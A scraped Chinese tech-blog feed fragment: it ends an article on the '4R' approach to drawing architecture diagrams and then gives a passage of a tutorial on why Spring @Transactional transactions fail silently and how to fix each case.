架构图如果只有静态结构（Role + Relation），就无法看到实际的运行机制。没有 Rule，我们无法验证设计是否合理，也难以发现隐藏的复杂性（如超时、回滚、幂等问题）。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71751593e847406b9808d4b5a7cd3c78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=rn%2FqahYhwLI2hjk%2BTeP7BcGOE7Q%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">第二部分：4R 实战应用 (Practical Application)</h2>
<p>理解了 4R，我们就可以用它来拆解软件工程中常见的四种核心架构图。你会发现，<strong>不同的架构图，本质上只是 Rank（层级）和 Role（角色） 变了，4R 的逻辑依然通用。</strong></p>
<h3 data-id="heading-6">① 业务架构图 (Business Architecture)</h3>
<p><strong>Rank (L1 宏观业务层)</strong>：这是非技术人员也能看懂的上帝视角。</p>
<ul>
<li><strong>Role (角色)</strong>：业务能力（如订单管理能力、支付能力）、业务部门、外部参与者（用户、商家）。</li>
<li><strong>Relation (关系)</strong>：价值流转、信息传递。</li>
<li><strong>Rule (规则)</strong>：宏观的业务流程（如：从下单到履约的全链路泳道图）。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3639d2e72e284559b53cad2aaca39bc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=7iZomi2kIWCHPc0cTxcbpHIZDYM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">② 系统架构图 (System Architecture)</h3>
<p><strong>Rank (L2 系统集成层)</strong>：这是架构师和 Tech Lead 最关注的视角。</p>
<ul>
<li><strong>Role (角色)</strong>：微服务、子系统、中间件（MQ, Cache）、数据库、第三方网关。</li>
<li><strong>Relation (关系)</strong>：RPC 调用、HTTP 请求、消息发布/订阅。</li>
<li><strong>Rule (规则)</strong>：跨服务的时序交互、分布式事务流程。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4e8511c9752474180cc58556a15f3df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=2VP05yMIM%2F7T9TC5qMZZVTToErE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">③ 应用架构图 (Application Architecture)</h3>
<p><strong>Rank (L3 内部代码层)</strong>：这是开发人员日常 Coding 的视角。</p>
<ul>
<li><strong>Role (角色)</strong>：代码分层（Controller, Service, Dao）、核心组件、类、接口。</li>
<li><strong>Relation (关系)</strong>：函数调用、类依赖、继承/实现。</li>
<li><strong>Rule (规则)</strong>：单个请求内部的处理逻辑、算法流程、异常捕获机制。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0cf4fcc625847f98c37408749db031d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=65Y1HHZzpfD1YrJll3Ead%2BjW6XE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">④ 部署架构图 (Deployment Architecture)</h3>
<p><strong>Rank (L4 基础设施层)</strong>：这是运维和 SRE 关注的物理/网络视角。</p>
<ul>
<li><strong>Role (角色)</strong>：物理机/虚拟机、Kubernetes Pod、负载均衡器 (LB)、防火墙、CDN、多活机房。</li>
<li><strong>Relation (关系)</strong>：网络连通性、VPC 子网、流量转发路径。</li>
<li><strong>Rule (规则)</strong>：高可用切换策略、自动扩缩容规则、多活路由规则。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/898a64200b0543c99ab239562862c8f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=3QX0vMCJEosE0pUDSYDf3hSsHQc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">⑤ 支付业务时序图 (Payment Business Sequence)</h3>
<p><strong>Rule 规则的业务实战</strong>：时序图展示支付业务在部署架构中的实际运行流程。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant U as 用户App
    participant C as CDN/WAF
    participant L as 负载均衡
    participant CS as 收银台服务
    participant T as 交易服务
    participant R as 风控服务
    participant CH as 渠道服务
    participant W as 微信支付
    
    U-&gt;&gt;C: 1. 发起支付请求
    C-&gt;&gt;C: 2. 安全检查&amp;加速
    C-&gt;&gt;L: 3. 转发请求
    L-&gt;&gt;CS: 4. 路由到收银台
    CS-&gt;&gt;T: 5. 创建支付订单
    T-&gt;&gt;R: 6. 异步风险评估
    R--&gt;&gt;T: 7. 风控通过
    T-&gt;&gt;CH: 8. 选择支付渠道
    CH-&gt;&gt;W: 9. 调用微信支付
    W--&gt;&gt;CH: 10. 支付成功
    CH--&gt;&gt;T: 11. 返回支付结果
    T--&gt;&gt;CS: 12. 更新订单状态
    CS--&gt;&gt;L: 13. 返回响应
    L--&gt;&gt;C: 14. 响应转发
    C--&gt;&gt;U: 15. 支付完成通知
</code></pre>
<p><strong>时序规则说明</strong>：</p>
<ol>
<li><strong>边缘处理</strong>：CDN加速 + WAF安全检查</li>
<li><strong>负载分发</strong>：智能路由到最优服务节点</li>
<li><strong>业务处理</strong>：订单创建 → 风险评估 → 渠道选择</li>
<li><strong>支付执行</strong>：调用第三方支付接口</li>
<li><strong>状态同步</strong>：更新订单状态并返回结果</li>
</ol>
<p>这个时序图完美展现了<strong>4R架构的Rule规则</strong>：</p>
<ul>
<li><strong>Rank</strong>：L4部署架构层的业务运行视角</li>
<li><strong>Role</strong>：部署架构中的各个组件角色</li>
<li><strong>Relation</strong>：组件间的调用关系和数据流</li>
<li><strong>Rule</strong>：支付业务的完整执行时序和协作规则</li>
</ul>
<h2 data-id="heading-11">总结</h2>
<p><strong>一句话总结</strong>：<strong>架构图不在于画得好看，而在于你想在一张图里讲好哪个层级的故事。</strong></p>
<p><strong>4R 的万能公式</strong>：
无论你画哪种图，先问自己四个问题：</p>
<ol>
<li><strong>Rank</strong>：我在画业务（L1）、系统（L2）、应用（L3）还是部署（L4）？</li>
<li><strong>Role</strong>：这一层的主角是谁？（部门？服务？类？机器？）</li>
<li><strong>Relation</strong>：它们怎么连？（价值流？API？函数？网线？）</li>
<li><strong>Rule</strong>：它们怎么动？（流程图/时序图）</li>
</ol>
<p>掌握了这个公式，你的架构设计将从混乱变得井井有条！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8591540c1d114a48a40e8e560e7c2cca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=%2F7hc5xayLYdez9XL%2BsDwPaDmRso%3D" alt="20a281b1ce2fad103eaaea57a6b74a4c.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Spring】事务失效场景详解：原理、问题与解决方案]]></title>    <link>https://juejin.cn/post/7580287891273007167</link>    <guid>https://juejin.cn/post/7580287891273007167</guid>    <pubDate>2025-12-06T09:28:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287891273007167" data-draft-id="7580282751628050473" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Spring】事务失效场景详解：原理、问题与解决方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T09:28:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyberShen"/> <meta itemprop="url" content="https://juejin.cn/user/554609587530014"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Spring】事务失效场景详解：原理、问题与解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/554609587530014/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyberShen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:28:46.000Z" title="Sat Dec 06 2025 09:28:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>作为Java开发工程师，相信大家对Spring中事务的使用并不陌生。但你可能只是停留在基础的使用层面上，当遇到特殊场景时，事务可能没有生效，直接在生产上暴露，导致严重的生产事故。今天，我们就来深入探讨Spring事务失效的各种场景及其解决方案 。</p>
<h2 data-id="heading-1">一、Spring事务原理简介</h2>
<p>在深入了解事务失效场景前，我们先简单回顾一下Spring事务的工作原理。在JDBC中，我们需要手动控制事务：获取连接、设置自动提交为false、执行SQL、提交或回滚事务。这种方式对业务代码侵入性太大 。 Spring通过<code>@Transactional</code>注解控制事务，底层基于AOP实现。Spring在bean初始化过程中，发现方法有<code>@Transactional</code>注解时，会对相应的Bean进行代理，生成代理对象。方法调用时，会执行切面逻辑，包括开启事务、提交或回滚事务等。需要注意的是，Spring本身不实现事务，底层仍然依赖于数据库的事务支持 。</p>
<h2 data-id="heading-2">二、Spring事务失效的常见场景</h2>
<h3 data-id="heading-3">1. 抛出检查异常（checked exceptions）</h3>
<p><strong>问题描述</strong>：当方法抛出检查异常（如IOException）而非运行时异常时，默认情况下事务不会回滚。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transactionTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
    UserService.insert(user);
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>();
}
</code></pre>
<p><strong>失效原因</strong>：Spring默认只会在遇到运行时异常（RuntimeException）或错误（Error）时进行回滚 。 <strong>解决方案</strong>：配置<code>rollbackFor</code>属性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transactionTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
    UserService.insert(user);
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>();
}
</code></pre>
<h3 data-id="heading-4">2. 业务方法本身捕获了异常</h3>
<p><strong>问题描述</strong>：在业务方法中捕获异常而不重新抛出，导致事务无法感知异常。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transactionTest</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        UserService.insert(user);
        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> / <span class="hljs-number">0</span>;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        e.printStackTrace(); <span class="hljs-comment">// 异常被"吃掉"了</span>
    }
}
</code></pre>
<p><strong>失效原因</strong>：Spring是否回滚事务取决于是否抛出异常，如果异常被捕获，Spring无法处理事务 。 <strong>解决方案</strong>：</p>
<ol>
<li>将异常原样抛出</li>
<li>手动设置回滚：<code>TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();</code></li>
</ol>
<h3 data-id="heading-5">3. 同一类中的方法调用</h3>
<p><strong>问题描述</strong>：在同一类中，非事务方法调用事务方法，事务不生效。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultTransactionService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        doInsert(); <span class="hljs-comment">// 直接调用，事务失效</span>
    }
    
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doInsert</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        UserService.insert(user);
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>();
    }
}
</code></pre>
<p><strong>失效原因</strong>：Spring的事务管理通过动态代理实现。当在同一个类中直接调用方法时，不会经过代理，而是直接调用真实对象的方法 。 <strong>解决方案</strong>：</p>
<ol>
<li>
<p>将方法拆分到不同的类中</p>
</li>
<li>
<p>通过代理对象调用：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultTransactionService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DefaultTransactionService self;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        self.doInsert(); <span class="hljs-comment">// 通过代理调用</span>
    }
}
</code></pre>
</li>
<li>
<p>使用<code>@EnableAspectJAutoProxy(exposeProxy = true)</code>和<code>AopContext.currentProxy()</code></p>
</li>
</ol>
<h3 data-id="heading-6">4. 方法使用final或static关键字</h3>
<p><strong>问题描述</strong>：使用final或static关键字修饰事务方法。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Transactional</span>
public final void <span class="hljs-built_in">save</span>(User user) {
    <span class="hljs-comment">// 业务逻辑</span>
}

<span class="hljs-variable">@Transactional</span>
public static void <span class="hljs-built_in">save</span>(User user) {
    <span class="hljs-comment">// 业务逻辑</span>
}
</code></pre>
<p><strong>失效原因</strong>：Spring使用Cglib代理时，通过生成子类并重写方法来实现代理。如果方法被final或static修饰，子类无法重写该方法。使用JDK动态代理时，基于接口实现，final和static方法也无法被代理 。 <strong>解决方案</strong>：移除方法上的final或static关键字。</p>
<h3 data-id="heading-7">5. 方法不是public</h3>
<p><strong>问题描述</strong>：对非public方法使用<code>@Transactional</code>注解。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">protected</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">User user</span>) {
    <span class="hljs-comment">// 业务逻辑</span>
}
</code></pre>
<p><strong>失效原因</strong>：Spring的事务管理源码<code>AbstractFallbackTransactionAttributeSource</code>中有判断，如果目标方法不是public的，则返回null 。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Don't allow no-public methods as required.</span>
<span class="hljs-keyword">if</span> (allowPublicMethodsOnly() &amp;&amp; !Modifier.isPublic(method.getModifiers())) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p><strong>解决方案</strong>：将方法访问级别改为public。</p>
<h3 data-id="heading-8">6. 错误使用传播机制</h3>
<p><strong>问题描述</strong>：事务传播行为配置不当导致事务不符合预期。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionService</span> {
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doInsert</span><span class="hljs-params">(User user, Address address)</span> <span class="hljs-keyword">throws</span> Exception {
        userMapper.insert(user);
        saveAddress(address);
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveAddress</span><span class="hljs-params">(Address address)</span> {
        addressMapper.insert(address);
    }
}
</code></pre>
<p><strong>失效原因</strong>：使用<code>REQUIRES_NEW</code>传播机制时，会新建事务并挂起当前事务。如果父事务发生异常，不会影响子事务的提交 。 <strong>传播机制说明</strong>：</p>
<ul>
<li><strong>REQUIRED</strong>（默认）：如果当前存在事务则加入，否则新建事务</li>
<li><strong>REQUIRES_NEW</strong>：新建事务，挂起当前事务（若存在）</li>
<li><strong>NOT_SUPPORTED</strong>：以非事务方式执行，挂起当前事务（若存在）</li>
<li><strong>SUPPORTS</strong>：如果当前有事务则加入，否则以非事务方式执行</li>
</ul>
<p><strong>解决方案</strong>：根据业务需求选择合适的传播行为，通常使用默认的REQUIRED即可。</p>
<h3 data-id="heading-9">7. 没有被Spring管理</h3>
<p><strong>问题描述</strong>：类没有被Spring管理，导致事务注解无效。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Service 注解被注释</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// 更新订单</span>
    }
}
</code></pre>
<p><strong>失效原因</strong>：如果类没有被Spring管理（没有<code>@Service</code>、<code>@Component</code>等注解），即使方法上有<code>@Transactional</code>注解，事务也不会生效 。 <strong>解决方案</strong>：确保类被Spring管理，添加相应的注解。</p>
<h3 data-id="heading-10">8. 多线程调用</h3>
<p><strong>问题描述</strong>：在多线程环境下调用事务方法。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RoleService roleService;
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(UserModel userModel)</span> <span class="hljs-keyword">throws</span> Exception {
        userMapper.insertUser(userModel);
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            roleService.doOtherThing(); <span class="hljs-comment">// 新线程中调用</span>
        }).start();
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RoleService</span> {
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doOtherThing</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>; <span class="hljs-comment">// 异常不会导致主事务回滚</span>
    }
}
</code></pre>
<p><strong>失效原因</strong>：Spring将数据库连接放在ThreadLocal中，不同线程使用不同的数据库连接，因此是多线程不同的事务 。 <strong>解决方案</strong>：尽量避免在多线程中处理事务，或考虑使用分布式事务。</p>
<h3 data-id="heading-11">9. 其他失效场景</h3>
<p><strong>数据库引擎不支持事务</strong>：如MySQL的MyISAM引擎不支持事务，应使用InnoDB引擎 。 <strong>事务管理器未配置</strong>：在Spring Boot中会自动配置，但在传统Spring项目中需手动配置事务管理器 。 <strong>切面顺序问题</strong>：自定义切面捕获异常可能导致事务失效 。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuditAspect</span> {
    <span class="hljs-meta">@Around(value = <span class="hljs-string">"execution (* com.example..*.*(..))"</span>)</span>
    <span class="hljs-keyword">public</span> Object around(ProceedingJoinPoint pjp) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> pjp.proceed();
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            <span class="hljs-comment">// 捕获异常后事务失效</span>
            log.error(<span class="hljs-string">"错误"</span>, e);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h2 data-id="heading-12">三、调试事务问题的方法</h2>
<ol>
<li>
<p><strong>开启事务日志</strong>：在application.properties中添加：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">logging.level.org.springframework.transaction</span>=DEBUG
</code></pre>
</li>
<li>
<p><strong>数据库监控</strong>：通过<code>SHOW ENGINE INNODB STATUS</code>查看事务状态 。</p>
</li>
<li>
<p><strong>代码审查</strong>：检查是否触发了上述失效场景。</p>
</li>
</ol>
<h2 data-id="heading-13">四、最佳实践总结</h2>
<ol>
<li><strong>明确事务边界</strong>：根据业务场景选择合适的传播行为，避免过度使用REQUIRES_NEW导致性能开销 。</li>
<li><strong>代理调用原则</strong>：同类方法调用必须通过代理对象（注入自身或AOP）。</li>
<li><strong>异常处理规范</strong>：事务方法避免"吞没"异常，统一使用运行时异常或配置<code>rollbackFor</code>。</li>
<li><strong>测试验证</strong>：编写单元测试和集成测试，验证事务行为是否符合预期。</li>
<li><strong>代码规范</strong>：遵循团队代码规范，统一事务使用方式。</li>
</ol>
<h2 data-id="heading-14">总结</h2>
